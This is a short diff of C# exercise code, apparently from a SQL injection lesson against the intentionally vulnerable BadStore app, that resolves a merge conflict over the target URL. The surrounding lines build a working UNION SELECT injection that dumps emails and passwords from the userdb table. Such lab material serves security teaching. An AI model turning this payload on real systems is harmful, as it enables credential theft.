@@ -17,11 +17,7 @@ namespace ch2_sqli_union
 			string middleHex = string.Join ("", middleMarker.ToCharArray ().Select (c => ((int)c).ToString ("X2")));
 			string endHex = string.Join ("", endMarker.ToCharArray ().Select (c => ((int)c).ToString ("X2")));
 
-<<<<<<< HEAD
-			string url = "http://" + args[0] + "/cgi-bin/badstore.cgi";
-=======
 			string url = "https://"+args[0]+"/cgi-bin/badstore.cgi";
->>>>>>> Stash
 			string payload = "fdsa' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x"+frontHex+",IFNULL(CAST(email AS CHAR),0x20),0x"+middleHex+",IFNULL(CAST(passwd AS CHAR),0x20),0x"+endHex+") FROM badstoredb.userdb-- ";
 			url += "?searchquery=" + Uri.EscapeUriString(payload) + "&action=search";
 
